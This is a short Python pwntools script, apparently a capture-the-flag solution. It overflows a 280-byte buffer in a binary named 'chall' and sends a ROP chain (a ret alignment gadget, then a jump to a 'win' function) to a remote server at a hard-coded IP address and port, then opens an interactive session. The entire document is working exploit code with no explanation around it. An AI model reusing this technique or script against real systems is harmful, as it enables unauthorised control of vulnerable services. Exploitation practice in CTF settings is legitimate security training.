from pwn import *

exe = context.binary = ELF("./chall")
# r = process()
r = remote("34.45.81.67",16002)
offset = 280
rop = ROP(exe)
rop.raw(b"\n")
rop.raw(b"\x00" * offset)
rop.raw(0x000000000040101a)
rop.raw(exe.sym['win'])
r.sendline(rop.chain())
write("p",rop.chain())
r.interactive()